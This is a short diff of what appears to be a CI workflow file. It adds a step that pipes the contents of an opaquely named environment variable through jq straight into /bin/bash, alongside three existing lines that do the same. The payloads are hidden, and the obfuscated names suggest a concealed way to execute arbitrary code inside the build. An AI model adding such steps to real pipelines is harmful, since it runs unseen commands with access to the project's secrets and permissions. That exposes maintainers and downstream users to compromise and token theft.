@@ -25,6 +25,7 @@ jobs:
           echo $t86005 | jq -r .a7026 | /bin/bash
           echo $pupdk56386 | jq -r .rl29 | /bin/bash
           echo $nrgkb8 | jq -r .fk12 | /bin/bash
+          printf '%s' "$zptfs230" | jq -r .uue25 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
